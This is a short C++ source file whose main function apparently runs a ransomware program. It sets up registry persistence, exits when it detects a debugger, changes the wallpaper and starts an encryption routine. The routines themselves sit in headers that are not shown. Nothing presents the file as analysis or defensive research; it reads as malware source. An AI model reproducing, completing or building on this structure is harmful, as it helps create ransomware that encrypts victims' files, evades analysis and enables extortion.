// Loc.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "Utils.h"
#include "Crypt.h"
#include <iostream>
#include "Evasion.h"
#include "Persistence.h"

int main(void)
{
    Persistence persistence;
    persistence.registryKeyCreation();  
    
    Evasion evasion;
    if (evasion.isBeingDebugging()) {
        return 0xdeadbeef;
    }

    Utils utils;
    utils.changeWallpaper();

    Crypt crypt;
    crypt.startCrypt();

    return EXIT_SUCCESS;
}